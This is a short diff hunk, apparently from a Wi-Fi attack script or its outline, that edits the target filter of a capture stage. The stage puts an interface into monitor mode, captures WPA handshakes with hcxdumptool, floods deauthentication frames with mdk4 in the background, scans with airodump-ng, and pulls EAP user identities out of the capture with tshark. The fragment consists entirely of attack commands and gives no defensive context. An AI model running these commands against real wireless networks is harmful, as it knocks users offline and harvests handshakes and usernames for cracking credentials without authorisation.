@@ -216,7 +216,7 @@ Workload: 3
     airmon-ng start $IFACE
 
 [1] Capture (120s)
-    hcxdumptool -i $MON -o $CAP [filterlist_ap=$TARGET]
+    hcxdumptool -i $MON -o $CAP [filterlist_ap=$WORK/filterlist]
     mdk4 $MON d -b $WORK/blacklist  (background, every 5s)
     airodump-ng --band abg --output-format csv -w $WORK/scan $MON
     tshark -r $CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity
